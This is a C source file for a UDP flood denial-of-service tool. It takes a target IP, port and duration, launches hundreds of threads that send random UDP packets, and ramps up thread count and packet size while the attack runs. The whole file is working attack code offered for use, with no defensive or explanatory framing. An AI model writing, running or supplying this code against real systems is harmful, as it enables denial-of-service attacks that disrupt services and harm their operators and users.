#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <stdatomic.h>

#define MIN_PACKET_SIZE 7
#define MAX_PACKET_SIZE 56
#define MIN_THREAD_COUNT 500
#define MAX_THREAD_COUNT 1000

// Structure for attack parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    atomic_int packet_size;
    atomic_int thread_count;
} attack_params;

// Global variables
volatile int keep_running = 1;
atomic_long total_data_sent = 0;

// Signal handler to stop the attack
void handle_signal(int signal) {
    keep_running = 0;
}

// Generate random payload
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;
    }
}

// Network monitor thread
void *network_monitor(void *arg) {
    while (keep_running) {
        sleep(1);
        double data_sent_mb = total_data_sent / (1024.0 * 1024.0);
        printf("Total Data Sent: %.2f MB\n", data_sent_mb);
    }
    pthread_exit(NULL);
}

// UDP flood function
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *message;

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Set non-blocking mode
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    // Configure target address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address.\n");
        close(sock);
        return NULL;
    }

    // Allocate and generate payload
    int current_packet_size = atomic_load(&params->packet_size);
    message = malloc(current_packet_size);
    if (!message) {
        perror("Memory allocation failed");
        close(sock);
        return NULL;
    }
    generate_random_payload(message, current_packet_size);

    // Attack loop with time synchronization
    time_t start_time = time(NULL);  // Start time for attack
    time_t end_time = start_time + params->duration; // End time after duration
    while (keep_running && time(NULL) < end_time) {  // Sync with time limit
        ssize_t sent = sendto(sock, message, current_packet_size, 0, 
                             (struct sockaddr *)&server_addr, sizeof(server_addr));
        
        if (sent > 0) {
            atomic_fetch_add(&total_data_sent, sent);
        } else if (sent < 0 && (errno != EWOULDBLOCK && errno != EAGAIN)) {
            perror("sendto failed");
            break;
        }
    }

    free(message);
    close(sock);
    pthread_exit(NULL);
}

// Function to increment thread count every 30 seconds
void *adjust_thread_count(void *arg) {
    attack_params *params = (attack_params *)arg;
    while (keep_running) {
        sleep(30);

        // Increase thread count by 20, but not beyond max limit
        int new_thread_count = atomic_load(&params->thread_count) + 20;
        if (new_thread_count > MAX_THREAD_COUNT) {
            new_thread_count = MAX_THREAD_COUNT;
        }
        atomic_store(&params->thread_count, new_thread_count);

        printf("Updated Thread Count -> Threads: %d\n", atomic_load(&params->thread_count));
    }
    pthread_exit(NULL);
}

// Function to increment packet size by 6 bytes every 40 seconds
void *adjust_packet_size(void *arg) {
    attack_params *params = (attack_params *)arg;
    while (keep_running) {
        sleep(45);

        // Increase packet size by 6, but not beyond max limit
        int new_packet_size = atomic_load(&params->packet_size) + 6;
        if (new_packet_size > MAX_PACKET_SIZE) {
            new_packet_size = MAX_PACKET_SIZE;
        }
        atomic_store(&params->packet_size, new_packet_size);

        printf("Updated Packet Size -> Packet Size: %d bytes\n", atomic_load(&params->packet_size));
    }
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s [IP] [PORT] [TIME]\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Parse input arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    // Setup signal handler
    signal(SIGINT, handle_signal);

    // Initial attack parameters
    atomic_int packet_size = ATOMIC_VAR_INIT(MIN_PACKET_SIZE);
    atomic_int thread_count = ATOMIC_VAR_INIT(MIN_THREAD_COUNT);

    attack_params params = {target_ip, target_port, duration, packet_size, thread_count};

    // Create monitor thread
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, network_monitor, NULL);

    // Create thread count adjustment thread
    pthread_t adjust_thread_count_thread;
    pthread_create(&adjust_thread_count_thread, NULL, adjust_thread_count, &params);

    // Create packet size adjustment thread
    pthread_t adjust_packet_size_thread;
    pthread_create(&adjust_packet_size_thread, NULL, adjust_packet_size, &params);

    // Attack loop with time sync, stop after duration
    time_t attack_start_time = time(NULL);
    while (keep_running && (time(NULL) - attack_start_time) < duration) {
        int current_threads = atomic_load(&params.thread_count);

        // Create attack threads
        pthread_t threads[current_threads];

        for (int i = 0; i < current_threads; i++) {
            if (pthread_create(&threads[i], NULL, udp_flood, &params) != 0) {
                fprintf(stderr, "Failed to create thread %d\n", i);
            }
        }

        // Wait for threads to finish
        for (int i = 0; i < current_threads; i++) {
            pthread_join(threads[i], NULL);
        }

        printf("Attack round complete -> Packet Size: %d bytes, Threads: %d\n",
               atomic_load(&params.packet_size), atomic_load(&params.thread_count));
    }

    // Stop monitor thread and adjustment threads
    keep_running = 0;
    pthread_join(monitor_thread, NULL);
    pthread_join(adjust_thread_count_thread, NULL);
    pthread_join(adjust_packet_size_thread, NULL);

    printf("Attack finished. All threads stopped.\n");
    return EXIT_SUCCESS;
}
